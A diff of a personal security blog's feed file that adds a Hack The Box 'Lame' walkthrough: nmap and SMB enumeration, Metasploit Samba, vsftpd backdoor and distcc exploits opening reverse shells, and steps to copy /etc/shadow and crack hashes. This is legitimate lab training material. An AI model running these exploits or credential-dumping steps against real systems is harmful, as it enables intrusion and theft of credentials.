@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-09-15T20:35:06-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Hi</title><subtitle>A very Mehh Networking and Cybersecurity online notebook and blog.
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-09-21T10:19:12-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Hi</title><subtitle>A very Mehh Networking and Cybersecurity online notebook and blog.
 </subtitle><author><name>Zack Jones</name></author><entry><title type="html">Because Resumes Just Aren’t That Good</title><link href="http://localhost:4000/blog/2020/09/03/Because-Resumes.html" rel="alternate" type="text/html" title="Because Resumes Just Aren’t That Good" /><published>2020-09-03T16:30:00-04:00</published><updated>2020-09-03T16:30:00-04:00</updated><id>http://localhost:4000/blog/2020/09/03/Because-Resumes</id><content type="html" xml:base="http://localhost:4000/blog/2020/09/03/Because-Resumes.html">&lt;h1 id=&quot;oh-hello&quot;&gt;Oh.. hello&lt;/h1&gt;
 &lt;p&gt;If you’re looking at this you’ve probably been linked to it via my resume or some other professional network. Thanks for swinging by. Loosen up your tie and grab a drink. This is the official long form of the resume, filling in all the gaps. I hope after reading this I sound like a pretty cool guy and maybe what you’re looking for. If you’re looking to hear about the professional experience &lt;a href=&quot;/blog/2020/09/03/Resume.html&quot;&gt;click here&lt;/a&gt;.&lt;/p&gt;
 
@@ -231,7 +231,7 @@ Zoho, SalesForce, and Hubspot. Helped manage and organize vendor clients for con
 &lt;h2 id=&quot;additional-experience&quot;&gt;Additional Experience&lt;/h2&gt;
 
 &lt;ul&gt;
-  &lt;li&gt;Coach and competing member of Danville Community College CyberKnights CTF competition team.&lt;/li&gt;
+  &lt;li&gt;Coach for Danville Community College CyberKnights CTF competition team. &lt;em&gt;(2017 - Current)&lt;/em&gt;&lt;/li&gt;
   &lt;li&gt;Tutored Cisco CCNA and Networking classes&lt;/li&gt;
   &lt;li&gt;Tutored Linux and OS classes&lt;/li&gt;
   &lt;li&gt;Participated in various Bsides CTFs including Eversec CTF in 2018 and 2017.&lt;/li&gt;
@@ -291,7 +291,278 @@ Zoho, SalesForce, and Hubspot. Helped manage and organize vendor clients for con
   &lt;li&gt;Forensics ToolKit&lt;/li&gt;
   &lt;li&gt;Wireshark&lt;/li&gt;
   &lt;li&gt;Technical Support&lt;/li&gt;
-&lt;/ul&gt;</content><author><name>Zack Jones</name></author><category term="Blog" /><summary type="html">Bio</summary></entry><entry><title type="html">Legacy HTB Writeup</title><link href="http://localhost:4000/infosec/2020/05/15/Legacy-HTB-Writeup.html" rel="alternate" type="text/html" title="Legacy HTB Writeup" /><published>2020-05-15T18:00:00-04:00</published><updated>2020-05-15T18:00:00-04:00</updated><id>http://localhost:4000/infosec/2020/05/15/Legacy-HTB-Writeup</id><content type="html" xml:base="http://localhost:4000/infosec/2020/05/15/Legacy-HTB-Writeup.html">&lt;p&gt;The Legacy HTB machine was one of the first HTB machines I ever broke into. It’s a retired box that is pretty basic, leaning towards understanding basic methodology and how to make use of CVEs that you find on a box. It’s a good start for practicing for the OSCP.&lt;/p&gt;
+&lt;/ul&gt;</content><author><name>Zack Jones</name></author><category term="Blog" /><summary type="html">Bio</summary></entry><entry><title type="html">Lame HTB Writeup</title><link href="http://localhost:4000/infosec/2020/05/17/Lame-HTB-Writeup.html" rel="alternate" type="text/html" title="Lame HTB Writeup" /><published>2020-05-17T18:00:00-04:00</published><updated>2020-05-17T18:00:00-04:00</updated><id>http://localhost:4000/infosec/2020/05/17/Lame-HTB-Writeup</id><content type="html" xml:base="http://localhost:4000/infosec/2020/05/17/Lame-HTB-Writeup.html">&lt;h1 id=&quot;lame&quot;&gt;Lame&lt;/h1&gt;
+
+&lt;p&gt;Linux machine&lt;/p&gt;
+
+&lt;h2 id=&quot;nmap&quot;&gt;nmap&lt;/h2&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -A -T4 -p- 10.10.10.3
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;ports&quot;&gt;ports&lt;/h2&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-11 23:09 EDT
+ Nmap scan report for 10.10.10.3
+ Host is up (0.093s latency).
+ Not shown: 65530 filtered ports
+ PORT     STATE SERVICE     VERSION
+ 21/tcp   open  ftp         3
+ |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+ | ftp-syst: 
+ |   STAT: 
+ | FTP server status:
+ |      Connected to 10.10.14.17
+ |      Logged in as ftp
+ |      TYPE: ASCII
+ |      No session bandwidth limit
+ |      Session timeout in seconds is 300
+ |      Control connection is plain text
+ |      Data connections will be plain text
+ |      vsFTPd 2.3.4 - secure, fast, stable
+ |_End of status
+ 22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+ | ssh-hostkey: 
+ |   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
+ |_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
+ 139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+ 445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
+ 3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
+ Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+ Aggressive OS guesses: OpenWrt White Russian 0.9 (Linux 2.4.30) (92%), Linux 2.6.23 (92%), Arris TG862G/CT cable modem (92%), Control4 HC-300 home controller (92%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 245 or 6556 printer (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%), Citrix XenServer 5.5 (Linux 2.6.18) (92%), Linux 2.6.27 - 2.6.28 (92%)
+ No exact OS matches for host (test conditions non-ideal).
+ Network Distance: 2 hops
+ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+ 
+ Host script results:
+ |_clock-skew: mean: -3d00h52m25s, deviation: 2h49m43s, median: -3d02h52m26s
+ | smb-os-discovery: 
+ |   OS: Unix (Samba 3.0.20-Debian)
+ |   Computer name: lame
+ |   NetBIOS computer name: 
+ |   Domain name: hackthebox.gr
+ |   FQDN: lame.hackthebox.gr
+ |_  System time: 2020-05-08T20:18:55-04:00
+ | smb-security-mode: 
+ |   account_used: &amp;lt;blank&amp;gt;
+ |   authentication_level: user
+ |   challenge_response: supported
+ |_  message_signing: disabled (dangerous, but default)
+ |_smb2-time: Protocol negotiation failed (SMB2)
+ 
+ TRACEROUTE (using port 445/tcp)
+ HOP RTT      ADDRESS
+ 1   91.69 ms 10.10.14.1
+ 2   91.99 ms 10.10.10.3
+ 
+ OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+ Nmap done: 1 IP address (1 host up) scanned in 158.53 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;smb-enum&quot;&gt;smb enum&lt;/h2&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbclient -L \\\10.10.10.3.\\
+allows for anon login try tmp
+smbclient \\\10.10.10.3\\tmp
+ls
+Nothing worth looking at. 
+version - samba 3.0.20-Debian  -from nmap scan.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;See if there are exploits on that SMB version.&lt;/p&gt;
+
+&lt;p&gt;found a module.&lt;/p&gt;
+
+&lt;h2 id=&quot;smb-exploit&quot;&gt;SMB Exploit&lt;/h2&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf5 &amp;gt; use exploit/multi/samba/usermap_script
+ msf5 exploit(multi/samba/usermap_script) &amp;gt; options
+ 
+ Module options (exploit/multi/samba/usermap_script):
+ 
+ Name    Current Setting  Required  Description
+ ----    ---------------  --------  -----------
+ RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&amp;lt;path&amp;gt;'
+ RPORT   139              yes       The target port (TCP)
+ 
+ 
+ Exploit target:
+ 
+ Id  Name
+ --  ----
+ 0   Automatic
+ 
+ 
+ msf5 exploit(multi/samba/usermap_script) &amp;gt; set rhost 10.10.10.3
+ rhost =&amp;gt; 10.10.10.3
+ msf5 exploit(multi/samba/usermap_script) &amp;gt; run
+ 
+ [*] Started reverse TCP double handler on 10.10.14.17:4444 
+ [*] Accepted the first client connection...
+ [*] Accepted the second client connection...
+ [*] Command: echo uoDexrJBt0bwYHdC;
+ [*] Writing to socket A
+ [*] Writing to socket B
+ [*] Reading from sockets...
+ [*] Reading from socket B
+ [*] B: &quot;uoDexrJBt0bwYHdC\r\n&quot;
+ [*] Matching...
+ [*] A is input...
+ [*] Command shell session 1 opened (10.10.14.17:4444 -&amp;gt; 10.10.10.3:46751) at 2020-05-11 23:14:41 -0400
+ 
+ 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;shell&quot;&gt;Shell&lt;/h2&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;whoami
+ root
+ hostname
+ lame
+ cd root
+ updatedb
+ locate root.txt
+ /root/root.txt
+ pwd
+ /root
+ cat root.txt
+ 92caac3be140ef409e45721348a4e9df
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;post-exploit&quot;&gt;Post exploit&lt;/h2&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cat /etc/passwd
+copy this and save it
+then get shadow
+cat /etc/shadow/
+grab the hashes and save them. 
+Run unshadow on the files you've made
+use hashcat against the unshadow file
+--------------------------------------
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;other-vulns&quot;&gt;Other Vulns&lt;/h1&gt;
+
+&lt;h2 id=&quot;check-the-ftp-version-for-exploits-ftp-version-vsftpd-234-has-metasploit-exploit&quot;&gt;check the ftp version for exploits. FTP version vsFTPd 2.3.4 has metasploit exploit.&lt;/h2&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf5 &amp;gt; use exploit/unix/ftp/vsftpd_234_backdoor
+ msf5 exploit(unix/ftp/vsftpd_234_backdoor) &amp;gt; show targets
+ 
+ Exploit targets:
+ 
+ Id  Name
+ --  ----
+ 0   Automatic
+ 
+ 
+ msf5 exploit(unix/ftp/vsftpd_234_backdoor) &amp;gt; options
+ 
+ Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+ 
+ Name    Current Setting  Required  Description
+ ----    ---------------  --------  -----------
+ RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&amp;lt;path&amp;gt;'
+ RPORT   21               yes       The target port (TCP)
+ 
+ 
+ Exploit target:
+ 
+ Id  Name
+ --  ----
+ 0   Automatic
+ 
+ 
+ msf5 exploit(unix/ftp/vsftpd_234_backdoor) &amp;gt; set rhosts 10.10.10.3
+ rhosts =&amp;gt; 10.10.10.3
+ msf5 exploit(unix/ftp/vsftpd_234_backdoor) &amp;gt; run
+ 
+ [*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
+ [*] 10.10.10.3:21 - USER: 331 Please specify the password.
+ [*] Exploit completed, but no session was created.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;manual-exploit&quot;&gt;Manual exploit&lt;/h2&gt;
+
+&lt;p&gt;found a manual exploit for vsFTPd 2.3.4 - connecting to the ftp and placing a : and ) into the USER field triggers opening port 6200&lt;/p&gt;
+
+&lt;p&gt;Manual exploit reference.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://mkirbypn.wordpress.com/2016/02/23/exploit-vstftpd-version-2-3-4/&quot;&gt;Exploit vsftpd version 2.3.4&lt;/a&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$telnet 10.10.10.3 21
+ Trying 10.10.10.3...
+ Connected to 10.10.10.3.
+ Escape character is '^]'.
+ 220 (vsFTPd 2.3.4)
+ USER WillThisWork: )
+ 331 Please specify the password.
+ PASS lolololol
+ 530 Login incorrect.
+ ^]
+ telnet&amp;gt; quit
+ Connection closed.
+ 
+$nmap -A -Pn -p 6200 10.10.10.3
+ Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-11 23:41 EDT
+ Nmap scan report for 10.10.10.3
+ Host is up.
+ 
+ PORT     STATE    SERVICE VERSION
+ 6200/tcp filtered lm-x
+ 
+ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+ Nmap done: 1 IP address (1 host up) scanned in 2.72 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;distcc-metasploit-exploit&quot;&gt;DistCC Metasploit exploit&lt;/h2&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf5 &amp;gt; use exploit/unix/misc/distcc_exec
+msf5 exploit(unix/misc/distcc_exec) &amp;gt; options
+
+Module options (exploit/unix/misc/distcc_exec):
+
+Name    Current Setting  Required  Description
+----    ---------------  --------  -----------
+RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&amp;lt;path&amp;gt;'
+RPORT   3632             yes       The target port (TCP)
+
+Exploit target:
+
+Id  Name
+--  ----
+0   Automatic Target
+
+msf5 exploit(unix/misc/distcc_exec) &amp;gt; set rhosts 10.10.10.3
+rhosts =&amp;gt; 10.10.10.3
+msf5 exploit(unix/misc/distcc_exec) &amp;gt; show targets
+
+Exploit targets:
+
+Id  Name
+--  ----
+0   Automatic Target
+
+msf5 exploit(unix/misc/distcc_exec) &amp;gt; run
+
+[*] Started reverse TCP double handler on 10.10.14.17:4444 
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo m93VaQ0EKR7SGV6V;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: &quot;m93VaQ0EKR7SGV6V\r\n&quot;
+[*] Matching...
+[*] A is input...
+[*] Command shell session 1 opened (10.10.14.17:4444 -&amp;gt; 10.10.10.3:46789) at 2020-05-11 23:49:23 -0400
+
+whoami
+daemon
+pwd
+/tmp
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Zack Jones</name></author><category term="InfoSec" /><summary type="html">Lame</summary></entry><entry><title type="html">Legacy HTB Writeup</title><link href="http://localhost:4000/infosec/2020/05/15/Legacy-HTB-Writeup.html" rel="alternate" type="text/html" title="Legacy HTB Writeup" /><published>2020-05-15T18:00:00-04:00</published><updated>2020-05-15T18:00:00-04:00</updated><id>http://localhost:4000/infosec/2020/05/15/Legacy-HTB-Writeup</id><content type="html" xml:base="http://localhost:4000/infosec/2020/05/15/Legacy-HTB-Writeup.html">&lt;p&gt;The Legacy HTB machine was one of the first HTB machines I ever broke into. It’s a retired box that is pretty basic, leaning towards understanding basic methodology and how to make use of CVEs that you find on a box. It’s a good start for practicing for the OSCP.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Legacy/Website_shot.png&quot; alt=&quot;Website Screenshot&quot; /&gt;&lt;/p&gt;
 
@@ -1367,33 +1638,4 @@ If there are any issues, use the report to help you sovle them before moving for
 
 &lt;p&gt;Your cluster should show up in the Cluster’s tool section of the Server Manager.&lt;/p&gt;
 
-&lt;h3 id=&quot;adding-a-shared-drive-to-the-cluster-iscsi&quot;&gt;Adding a shared Drive to the Cluster (iSCSI)&lt;/h3&gt;</content><author><name>Zack Jones</name></author><category term="Server" /><summary type="html">Installing the Failover Feature To add this feature, in Server Manager go to Manage and Add Roles and Features. From the Features list select Failover Clustering</summary></entry><entry><title type="html">Implementing Networking Load Balancing</title><link href="http://localhost:4000/server/2018/03/28/Implementing-Networking-Load-Balancing.html" rel="alternate" type="text/html" title="Implementing Networking Load Balancing" /><published>2018-03-28T22:54:00-04:00</published><updated>2018-03-28T22:54:00-04:00</updated><id>http://localhost:4000/server/2018/03/28/Implementing-Networking-Load-Balancing</id><content type="html" xml:base="http://localhost:4000/server/2018/03/28/Implementing-Networking-Load-Balancing.html">&lt;p&gt;Before you can Implement Network Load Balancing, here are some prerequisites:&lt;/p&gt;
-
-&lt;h3 id=&quot;prerequisites&quot;&gt;Prerequisites&lt;/h3&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;All hosts in the cluster must be on the same subnet&lt;/li&gt;
-  &lt;li&gt;All adapters in cluster must be setup as either &lt;em&gt;multicast&lt;/em&gt; or &lt;em&gt;unicast&lt;/em&gt; but not a mixture of both&lt;/li&gt;
-  &lt;li&gt;&lt;em&gt;if unicast&lt;/em&gt; the NIC used to handle client-to-cluster traffic must support changing its MAC address&lt;/li&gt;
-  &lt;li&gt;IPs must be static on the nodes.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;installing-nlb-nodes&quot;&gt;Installing NLB Nodes&lt;/h3&gt;
-&lt;p&gt;Like most other features. You must install this from Server Manager, add roles and features.&lt;/p&gt;
-
-&lt;p&gt;Select &lt;em&gt;Network Load Balancing&lt;/em&gt; from the features section.&lt;/p&gt;
-
-&lt;h3 id=&quot;creating-a-nlb-cluster&quot;&gt;Creating a NLB Cluster&lt;/h3&gt;
-
-&lt;p&gt;Under the Netowkr Load Blancing Manger&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;Right click the cluster and click New Cluster&lt;/li&gt;
-  &lt;li&gt;Set the host as your current server&lt;/li&gt;
-  &lt;li&gt;Select the interface for this specific cluster&lt;/li&gt;
-  &lt;li&gt;find the IP address in the Dedicated IP address section and hit next&lt;/li&gt;
-  &lt;li&gt;Add an IP address that is shared by all clusters and it will add the IP to the adapters&lt;/li&gt;
-  &lt;li&gt;add the IP address for the NLB Cluster&lt;/li&gt;
-  &lt;li&gt;On the Cluster Parameters page, type the full internet name for the cluster, and then set operation mode to either Unicast or Multicast, etc.&lt;/li&gt;
-  &lt;li&gt;Set any applicable port rules&lt;/li&gt;
-  &lt;li&gt;Now just add hosts to this cluster as needed.&lt;/li&gt;
-&lt;/ul&gt;</content><author><name>Zack Jones</name></author><category term="Server" /><summary type="html">Before you can Implement Network Load Balancing, here are some prerequisites:</summary></entry></feed>
+&lt;h3 id=&quot;adding-a-shared-drive-to-the-cluster-iscsi&quot;&gt;Adding a shared Drive to the Cluster (iSCSI)&lt;/h3&gt;</content><author><name>Zack Jones</name></author><category term="Server" /><summary type="html">Installing the Failover Feature To add this feature, in Server Manager go to Manage and Add Roles and Features. From the Features list select Failover Clustering</summary></entry></feed>
